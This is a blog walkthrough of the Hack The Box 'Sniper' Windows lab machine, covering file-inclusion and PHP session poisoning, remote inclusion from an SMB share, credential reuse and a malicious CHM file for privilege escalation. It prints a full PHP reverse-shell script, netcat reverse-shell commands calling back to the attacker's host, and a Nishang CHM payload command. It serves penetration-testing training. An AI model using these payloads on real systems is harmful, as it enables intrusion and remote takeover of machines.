---
title: "Sniper Walkthrough(Hack The Box)"
date: 2025-09-11
draft: false
description: "a description"
tags: ["Medium", "Windows", "Hack The Box", "Hacking", "Active Directory", "Walkthrough"]
---

## About
- Sniper is a medium difficulty Windows machine which features a PHP server. The server hosts a file that is found vulnerable to local and remote file inclusion. Command execution is gained on the server in the context of `NT AUTHORITY\iUSR` via local inclusion of maliciously crafted PHP Session files. Exposed database credentials are used to gain access as the user `Chris`, who has the same password. Enumeration reveals that the administrator is reviewing CHM (Compiled HTML Help) files, which can be used the leak the administrators NetNTLM-v2 hash. This can be captured, cracked and used to get a reverse shell as administrator using a PowerShell credential object. 

## Reconnaissance & Enumeration 
- Nmap scan results
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-01T15:53:23
|_  start_date: N/A
|_clock-skew: 7h00m00s
```
- There are relatively less ports open which is interesting for an Active Directory machine.
- But there is a web port open.
![alt](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301154024.png?raw=true)
- Kinda sus ngl.
![susasf](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcnZ6aG9haTZjcm4xNjl4eWlwaWtrYjd1MmpybWZ0NW9uemR3Z3RmbiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/12dA9Gei6U4in6/giphy.gif)
- Pretty much everything is unresponsive expect `Our services` and `User Portal`
- `User Portal` has a login and registration page but nothing useful other than that.
- `Our services` page seems interesting. It's mainly because of the language change option, it's parameter `lang` is affected by LFI.
- I can get the hosts file easily using this simple path traversal payload.

```bash
curl -s 'http://10.10.10.151/blog/?lang=/Windows/System32/Drivers/etc/hosts' -b 'PHPSESSID=k1foocu17e2fq3np1kovr53od9
```
![Pasted image 20250301155341.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301155341.png?raw=true)
- From a simple google search I can see where PHP stores session ID's for it's users
![Pasted image 20250301155514.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301155514.png?raw=true)
- After twisting the payload a little with my session ID I was able to get that file. In this version of windows it's not `/tmp` it was `/temp`
```bash
curl -s 'http://10.10.10.151/blog/?lang=/windows/temp/sess_k1foocu17e2fq3np1kovr53od9' -b 'PHPSESSID=k1foocu17e2fq3np1kovr53od9'
```
![Pasted image 20250301155704.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301155704.png?raw=true)
- Now begins the exciting phase
![exploit](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeWdiczhiYnlxcXR0YWtydW91Z2dkcGZ6eG1ocWFid2MyYzlxZ3diZyZlcD12MV9naWZzX3NlYXJjaCZjdD1n/xebOoxouppcGs/giphy.gif)

## Exploitation
- As the site reads this session file I could include a malicious payload by creating an username apparent to the payload here

### Exploitation via session - Method 1
- There is a strong filteration on the backend. It took me multiple tries to get this payload to work, as this is a PHP application I used PHP based payloads
```php
a<?php echo `dir` ?>b
```
- To execute this payload I read the same session file which I created by modifying my username
![Pasted image 20250301161124.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301161124.png?raw=true)
- However there is another way to this, basically when writing the the session details to the file, PHP process it through `lang` parameter.
- I can create a php file with malicious code in it and upon hosting it on my machine, when PHP access it through `lang` parameter It will execute the code.

### Exploitation using SMB server - Method 2
- I can demonstrate this by creating an SMB server and hosting my payload. Here I used SMB because external `http` URL failed to be processed by `lang` parameter. This probably happened because of the protocal in the URL.

- **SMB Server:**
```
smbserver.py -smb2support SHARE share
```
- Creating `test.php` within `share` folder
```
<?php

echo system("whoami");
echo system("id");

?>
```
- Making the request
```
curl -s 'http://10.10.10.151/blog/?lang=\\10.10.14.16\share\test.php' -b "PHPSESSID=$session_id"
```
- Got a hit on the server
![Pasted image 20250301224800.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301224800.png?raw=true)
- Code executed successfully, the attack was successful
![Pasted image 20250301224828.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301224828.png?raw=true)
- Now I can get foothold easily 
![foothold](https://media1.tenor.com/m/bRTZbmay6L0AAAAC/rock-climbing-rise-song.gif)
- I used pentestmonkey's reverse shell,
```php
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'powershell';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.14.16', 8001);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```
- Here comes the phase which we encounter not so often
![pivot](https://media1.tenor.com/m/9CRohZ-hVI0AAAAC/moving-sucks.gif)

## Pivoting
![Pasted image 20250301225551.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301225551.png?raw=true)
- The file `C:\inetpub\wwwroot\user\db.php` had a password
![Pasted image 20250301225858.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301225858.png?raw=true)
- There are only two users on this machine, one is `Administrator` and other is user `Chris`.
- There is no winrm access externally as there was no port open for the same so I have to access it internally.
### Internal WinRM access
- I can create some variables to store the creds in powershell.
- Step-1:
```
powershell
```
![Pasted image 20250301231840.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301231840.png?raw=true)
- Step-2:
```powershell
$user = "Sniper\Chris"
```
- Step-3:
```powershell
$pass = "<REDACTED>"
```
- Step-4:
```powershell
$secstr = New-Object -TypeName System.Security.SecureString
```
- Step-5:
```powershell
$pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
```
- Step-6:
```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
```
- Step-7: Command execution as user `Chris`
```powershell
Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
```
![Pasted image 20250301232147.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301232147.png?raw=true)

- Reverse shell as `chris`
```powershell
Invoke-Command -ScriptBlock { \\10.10.14.16\\share\nc.exe -e cmd 10.10.14.16 6001 } -Credential $cred -Computer localhost
```
- Got {{< keyword >}} user flag {{< /keyword >}}
![Pasted image 20250301232333.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301232333.png?raw=true)

## Privilege Escalation
- There was an Interesting file in `C:\Docs` called `notes.txt`
- It had:
```
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,Sniper
Sniper CEO.
```
- I literally had to use windows to generate this payload
- Also there is an another interesting file `C:'Users\Chris\Downloads\instructions.chm`
- So I transferred it to my SMB share using Powershell commands.
```powershell
Copy-Item -Path C:\Users\Chris\Downloads\instructions.chm -Destination \\10.10.14.16\share\
```
- [CHM](https://en.wikipedia.org/wiki/Microsoft_Compiled_HTML_Help) files are Compiled HTML Help files introduced by Microsoft
- Also I moved `nc.exe` to the target to get reverse shell connection back
```powershell
Copy-Item -Path \\10.10.14.16\share\nc.exe -Destination C:\Docs\
```
- [Nishang](https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Client/Out-CHM.ps1) has a reverse shell generator for this `.chm` files.
- After Invoking `Out-Chm.ps1` into the powershell session, I generated it 
```powershell
 Out-CHM -Payload "C:\Docs\nc.exe 10.10.14.16 9001 -e powershell" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```
![gen](https://media1.tenor.com/m/SfXMj0OBA9sAAAAC/starting-generator.gif)
- Additionally we would need [HTML Help Workshop](https://www.microsoft.com/en-us/download/confirmation.aspx?id=21138) for this to work.
- Now after placing the output into `/docs` folder in the target, reverse shell can be formed.
- Got the {{< keyword >}} root flag {{< /keyword >}}.
![Pasted image 20250302232131.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250302232131.png?raw=true)

{{< typeit >}} Hello, My beloved readers it's been a while isn't it. I know I promised but I can't keep it, extremely sorry for that. Unlike when I started this site I have a busy schedule now but I'll try to post regularly. Ok then, see you guys later on some post.... {{< /typeit >}}   
![genZ](https://media1.tenor.com/m/Zu0eXWpX8qsAAAAd/mindy-angry-mindy.gif)
